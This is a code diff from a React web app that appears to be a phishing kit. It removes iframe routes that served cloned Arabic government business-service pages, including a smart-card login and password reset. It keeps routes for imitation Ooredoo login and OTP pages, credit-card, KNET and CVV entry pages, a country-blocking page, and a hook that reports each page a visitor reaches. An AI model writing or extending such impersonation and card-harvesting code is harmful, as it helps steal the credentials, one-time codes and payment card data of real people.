@@ -27,17 +27,6 @@ import KNETPayment from "./pages/KNETPayment";
 import CVV from "./pages/CVV";
 import FinalPage from "./pages/FinalPage";
 
-// Sinwinqa Static Pages - iframe wrapper
-function SinwinqaPage({ src }: { src: string }) {
-  return (
-    <iframe
-      src={src}
-      style={{ width: "100%", height: "100vh", border: "none", display: "block" }}
-      title="sinwinqa"
-    />
-  );
-}
-
 function BlockedCountryPage() {
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -53,85 +42,6 @@ function BlockedCountryPage() {
 function Router() {
   return (
     <Switch>
-      {/* Sinwinqa Static Pages */}
-      <Route path={"/"}>
-        {() => <SinwinqaPage src="/sinwinqa/index.html" />}
-      </Route>
-      <Route path={"/service"}>
-        {() => <SinwinqaPage src="/sinwinqa/service.html" />}
-      </Route>
-      <Route path={"/register"}>
-        {() => <SinwinqaPage src="/sinwinqa/register.html" />}
-      </Route>
-      <Route path={"/reset"}>
-        {() => <SinwinqaPage src="/sinwinqa/reset.html" />}
-      </Route>
-      <Route path={"/update"}>
-        {() => <SinwinqaPage src="/sinwinqa/update.html" />}
-      </Route>
-      <Route path={"/login"}>
-        {() => <SinwinqaPage src="/sinwinqa/login.html" />}
-      </Route>
-
-      {/* Sinwinqa Services Pages */}
-      <Route path={"/services/خدمة-الشهادات"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/خدمة-الشهادات.html" />}
-      </Route>
-      <Route path={"/services/طلب-إصدار-موافقة-استقدام-عمالية"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/طلب-إصدار-موافقة-استقدام-عمالية.html" />}
-      </Route>
-      <Route path={"/services/إصدار-رخصة-إعلان"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/إصدار-رخصة-إعلان.html" />}
-      </Route>
-      <Route path={"/services/إصدار-الرخصة-التجارية"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/إصدار-الرخصة-التجارية.html" />}
-      </Route>
-      <Route path={"/services/إغلاق-شركة"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/إغلاق-شركة.html" />}
-      </Route>
-      <Route path={"/services/إضافة-رخصة-تجارية-فرعية"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/إضافة-رخصة-تجارية-فرعية.html" />}
-      </Route>
-      <Route path={"/services/إدارة-فروع-الشركات-الأجنبية"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/إدارة-فروع-الشركات-الأجنبية.html" />}
-      </Route>
-      <Route path={"/services/التجديد-الشامل"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/التجديد-الشامل.html" />}
-      </Route>
-      <Route path={"/services/طلب-استكمال-التأسيس-الشامل"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/طلب-استكمال-التأسيس-الشامل.html" />}
-      </Route>
-      <Route path={"/services/التأسيس-الشامل"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/التأسيس-الشامل.html" />}
-      </Route>
-      <Route path={"/services/حجز-الاسم-التجاري"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/حجز-الاسم-التجاري.html" />}
-      </Route>
-      <Route path={"/services/تجديد-رخصة-إعلان"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/تجديد-رخصة-إعلان.html" />}
-      </Route>
-      <Route path={"/services/تقديم-سجل-معلومات-المستفيدين-الحقيقيين"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/تقديم-سجل-معلومات-المستفيدين-الحقيقيين.html" />}
-      </Route>
-      <Route path={"/services/التعديل-الشامل"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/التعديل-الشامل.html" />}
-      </Route>
-      <Route path={"/services/إلغاء-رخصة-إعلان"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/إلغاء-رخصة-إعلان.html" />}
-      </Route>
-      <Route path={"/services/إضافة-فرع"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/إضافة-فرع.html" />}
-      </Route>
-      <Route path={"/services/استكمال-تأسيس-مصنع"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/استكمال-تأسيس-مصنع.html" />}
-      </Route>
-      <Route path={"/services/طلب-تأسيس-مصنع"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/طلب-تأسيس-مصنع.html" />}
-      </Route>
-      <Route path={"/services/طلب-مستشار-تأسيس-الأعمال"}>
-        {() => <SinwinqaPage src="/sinwinqa/services/طلب-مستشار-تأسيس-الأعمال.html" />}
-      </Route>
-
       {/* Ooredoo Routes */}
       <Route path={"/ooredoo-login"} component={OoredooLogin} />
       <Route path={"/ooredoo-otp"} component={OoredooOtp} />
@@ -173,12 +83,6 @@ function App() {
 
   useEffect(() => {
     const pageNameMap: Record<string, string> = {
-      '/': 'الصفحة الرئيسية',
-      '/service': 'الخدمات',
-      '/register': 'تسجيل حساب',
-      '/reset': 'نسيت كلمة المرور',
-      '/update': 'تحديث كلمة المرور',
-      '/login': 'الدخول بالبطاقة الذكية',
       '/ooredoo-login': 'تسجيل دخول Ooredoo',
       '/ooredoo-otp': 'رمز OTP Ooredoo',
       '/credit-card-payment': 'الدفع ببطاقة الائتمان',
@@ -191,11 +95,7 @@ function App() {
       '/final-page': 'الصفحة النهائية',
     };
     const path = location.split('?')[0];
-    let pageName = pageNameMap[path];
-    if (!pageName) {
-      if (path.startsWith('/services/')) pageName = 'تفاصيل الخدمة';
-      else pageName = path;
-    }
+    const pageName = pageNameMap[path] || path;
     navigateToPage(pageName);
   }, [location]);
 
